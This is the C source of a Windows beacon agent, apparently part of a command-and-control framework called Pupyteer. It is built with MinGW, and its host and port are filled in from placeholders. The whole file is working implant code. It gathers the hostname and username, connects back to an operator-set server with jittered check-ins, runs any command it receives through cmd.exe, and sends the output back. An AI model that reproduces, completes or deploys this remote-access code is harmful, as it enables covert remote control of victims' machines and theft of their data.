/*
 * Pupyteer PE Agent Stub — Windows TCP Beacon
 * ------------------------------------------------
 * MinGW cross-compiled Windows agent that connects back to a
 * Pupyteer TCP listener using the JSON-line protocol.
 *
 * Compile:
 *   x86_64-w64-mingw32-gcc -o agent.exe agent.c -lws2_32
 *
 * Protocol (newline-delimited JSON over TCP):
 *   Agent -> Server:
 *     {"type":"register","hostname":"...","os":"windows","arch":"x64",
 *      "username":"...","agent_version":"..."}
 *     {"type":"checkin","session_id":"..."}
 *     {"type":"output","session_id":"...","command_id":"...","output":"..."}
 *   Server -> Agent:
 *     {"type":"registered","session_id":"..."}
 *     {"type":"commands","commands":[{"command_id":"...","command":"..."}]}
 *     {"type":"ack"}
 *     {"type":"error","message":"..."}
 */

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif

#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <io.h>
#include <math.h>

/* ── build-time configuration (filled by PEBuilder) ── */
#ifndef AGENT_HOST
#define AGENT_HOST "{{HOST}}"
#endif
#ifndef AGENT_PORT
#define AGENT_PORT {{PORT}}
#endif
#ifndef AGENT_SLEEP
#define AGENT_SLEEP {{SLEEP}}
#endif
#ifndef AGENT_JITTER
#define AGENT_JITTER {{JITTER}}
#endif
#ifndef AGENT_VERSION
#define AGENT_VERSION "1.0.0"
#endif

#define RECV_BUF_SIZE 65536
#define SEND_BUF_SIZE 65536
#define MAX_CMD_OUTPUT (32 * 1024)

static char g_session_id[64] = {0};
static char g_hostname[256] = {0};
static char g_username[256] = {0};
static const char *g_agent_version = AGENT_VERSION;

/* ── helpers ── */

static void get_hostname(void) {
    DWORD sz = sizeof(g_hostname);
    if (!GetComputerNameA(g_hostname, &sz)) {
        strncpy_s(g_hostname, sizeof(g_hostname), "unknown", _TRUNCATE);
    }
}

static void get_username(void) {
    DWORD sz = sizeof(g_username);
    if (!GetUserNameA(g_username, &sz)) {
        strncpy_s(g_username, sizeof(g_username), "unknown", _TRUNCATE);
    }
}

/* Sleep for base_seconds * (1 +/- jitter_pct/100) */
static void jittered_sleep(int base_seconds, int jitter_pct) {
    if (jitter_pct <= 0) {
        Sleep((DWORD)base_seconds * 1000);
        return;
    }
    double delta = (double)base_seconds * (jitter_pct / 100.0);
    double offset = ((double)rand() / RAND_MAX * 2.0 - 1.0) * delta;
    double total = (double)base_seconds + offset;
    if (total < 1.0) total = 1.0;
    Sleep((DWORD)(total * 1000));
}

/* ── socket I/O ── */

static int sock_send(SOCKET s, const char *data) {
    size_t len = strlen(data);
    size_t sent = 0;
    while (sent < len) {
        int n = send(s, data + sent, (int)(len - sent), 0);
        if (n <= 0) return -1;
        sent += (size_t)n;
    }
    if (send(s, "\n", 1, 0) != 1) return -1;
    return 0;
}

static int sock_readline(SOCKET s, char *buf, int len) {
    int total = 0;
    char c;
    while (total < len - 1) {
        int n = recv(s, &c, 1, 0);
        if (n <= 0) return -1;
        if (c == '\n') break;
        if (c == '\r') continue;
        buf[total++] = c;
    }
    buf[total] = '\0';
    return total;
}

/* ── JSON helpers ── */

static const char *json_get_string(const char *json, const char *key, char *out, size_t out_sz) {
    char pattern[128];
    snprintf(pattern, sizeof(pattern), "\"%s\"", key);
    const char *p = strstr(json, pattern);
    if (!p) { out[0] = '\0'; return NULL; }
    p += strlen(pattern);
    while (*p && (*p == ' ' || *p == '\t' || *p == ':' || *p == ',')) p++;
    if (*p != '"') { out[0] = '\0'; return NULL; }
    p++;
    size_t i = 0;
    while (*p && *p != '"' && i < out_sz - 1) {
        if (*p == '\\' && p[1]) {
            p++;
            switch (*p) {
                case 'n': out[i++] = '\n'; break;
                case 'r': out[i++] = '\r'; break;
                case 't': out[i++] = '\t'; break;
                case '"': out[i++] = '"'; break;
                case '\\': out[i++] = '\\'; break;
                default: out[i++] = *p; break;
            }
        } else {
            out[i++] = *p;
        }
        p++;
    }
    out[i] = '\0';
    return out;
}

static void json_escape(const char *src, char *dst, size_t dst_sz) {
    size_t j = 0;
    while (*src && j < dst_sz - 2) {
        switch (*src) {
            case '"':  dst[j++] = '\\'; dst[j++] = '"'; break;
            case '\\': dst[j++] = '\\'; dst[j++] = '\\'; break;
            case '\n': dst[j++] = '\\'; dst[j++] = 'n'; break;
            case '\r': dst[j++] = '\\'; dst[j++] = 'r'; break;
            case '\t': dst[j++] = '\\'; dst[j++] = 't'; break;
            default:   dst[j++] = *src; break;
        }
        src++;
    }
    dst[j] = '\0';
}

/* ── command execution ── */

static void exec_command(const char *cmd, char *out, size_t out_sz) {
    char tmpfile[MAX_PATH];
    char cmdline[4096];
    DWORD tick = GetTickCount();
    snprintf(tmpfile, MAX_PATH, "%s\\pupyteer_tmp_%lu.txt",
             getenv("TEMP") ? getenv("TEMP") : "C:\\Windows\\Temp", tick);
    snprintf(cmdline, sizeof(cmdline), "cmd.exe /c \"%s\" > \"%s\" 2>&1", cmd, tmpfile);

    int rc = system(cmdline);

    FILE *f = NULL;
    fopen_s(&f, tmpfile, "r");
    if (f) {
        size_t nread = fread(out, 1, out_sz - 1, f);
        out[nread] = '\0';
        fclose(f);
        DeleteFileA(tmpfile);
    } else {
        snprintf(out, out_sz, "command executed (rc=%d), output capture unavailable", rc);
    }
}

/* ── protocol handlers ── */

static int handle_register(SOCKET s) {
    char escaped_host[512], escaped_user[512];
    char msg[SEND_BUF_SIZE];
    json_escape(g_hostname, escaped_host, sizeof(escaped_host));
    json_escape(g_username, escaped_user, sizeof(escaped_user));
    snprintf(msg, sizeof(msg),
             "{\"type\":\"register\",\"hostname\":\"%s\",\"os\":\"windows\","
             "\"arch\":\"x64\",\"username\":\"%s\",\"agent_version\":\"%s\"}",
             escaped_host, escaped_user, g_agent_version);
    return sock_send(s, msg);
}

static int handle_server_msg(SOCKET s, const char *line) {
    char msg_type[32] = {0};
    json_get_string(line, "type", msg_type, sizeof(msg_type));

    if (strcmp(msg_type, "registered") == 0) {
        char sid[64] = {0};
        json_get_string(line, "session_id", sid, sizeof(sid));
        if (sid[0]) {
            strncpy_s(g_session_id, sizeof(g_session_id), sid, _TRUNCATE);
        }
        return 0;
    }

    if (strcmp(msg_type, "ack") == 0) return 0;

    if (strcmp(msg_type, "error") == 0) return -1;

    if (strcmp(msg_type, "commands") == 0) {
        const char *arr_start = strstr(line, "\"commands\"");
        if (!arr_start) return 0;
        arr_start = strchr(arr_start, '[');
        if (!arr_start) return 0;

        const char *p = arr_start + 1;
        while (*p) {
            while (*p && *p != '{') {
                if (*p == ']') return 0;
                p++;
            }
            if (!*p) break;

            const char *obj_start = p;
            int depth = 0;
            const char *obj_end = p;
            while (*obj_end) {
                if (*obj_end == '{') depth++;
                else if (*obj_end == '}') { depth--; if (depth == 0) { obj_end++; break; } }
                obj_end++;
            }
            size_t obj_len = (size_t)(obj_end - obj_start);
            char obj[2048];
            if (obj_len >= sizeof(obj)) obj_len = sizeof(obj) - 1;
            memcpy(obj, obj_start, obj_len);
            obj[obj_len] = '\0';

            char cmd_id[64] = {0};
            char cmd[1024] = {0};
            json_get_string(obj, "command_id", cmd_id, sizeof(cmd_id));
            json_get_string(obj, "command", cmd, sizeof(cmd));

            if (cmd[0]) {
                char output[MAX_CMD_OUTPUT];
                char escaped_out[MAX_CMD_OUTPUT];
                exec_command(cmd, output, sizeof(output));
                json_escape(output, escaped_out, sizeof(escaped_out));

                char out_msg[SEND_BUF_SIZE];
                snprintf(out_msg, sizeof(out_msg),
                         "{\"type\":\"output\",\"session_id\":\"%s\","
                         "\"command_id\":\"%s\",\"output\":\"%s\"}",
                         g_session_id, cmd_id, escaped_out);
                if (sock_send(s, out_msg) != 0) return -1;
            }
            p = obj_end;
        }
        return 0;
    }

    return 0;
}

/* ── main ── */

int main(void) {
    WSADATA wsa;
    srand((unsigned int)time(NULL) ^ GetCurrentProcessId());

    get_hostname();
    get_username();

    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        return 1;
    }

    while (1) {
        SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (s == INVALID_SOCKET) {
            jittered_sleep(AGENT_SLEEP, AGENT_JITTER);
            continue;
        }

        struct sockaddr_in addr;
        memset(&addr, 0, sizeof(addr));
        addr.sin_family = AF_INET;
        addr.sin_port = htons((u_short)AGENT_PORT);
        inet_pton(AF_INET, AGENT_HOST, &addr.sin_addr);

        if (connect(s, (struct sockaddr *)&addr, sizeof(addr)) != 0) {
            closesocket(s);
            jittered_sleep(AGENT_SLEEP, AGENT_JITTER);
            continue;
        }

        g_session_id[0] = '\0';
        if (handle_register(s) != 0) {
            closesocket(s);
            jittered_sleep(AGENT_SLEEP, AGENT_JITTER);
            continue;
        }

        char line[RECV_BUF_SIZE];
        if (sock_readline(s, line, sizeof(line)) <= 0) {
            closesocket(s);
            jittered_sleep(AGENT_SLEEP, AGENT_JITTER);
            continue;
        }
        if (handle_server_msg(s, line) != 0) {
            closesocket(s);
            jittered_sleep(AGENT_SLEEP, AGENT_JITTER);
            continue;
        }

        while (1) {
            char checkin[SEND_BUF_SIZE];
            snprintf(checkin, sizeof(checkin),
                     "{\"type\":\"checkin\",\"session_id\":\"%s\"}", g_session_id);
            if (sock_send(s, checkin) != 0) break;

            if (sock_readline(s, line, sizeof(line)) <= 0) break;
            if (handle_server_msg(s, line) != 0) break;

            jittered_sleep(AGENT_SLEEP, AGENT_JITTER);
        }

        closesocket(s);
        jittered_sleep(AGENT_SLEEP, AGENT_JITTER);
    }

    WSACleanup();
    return 0;
}
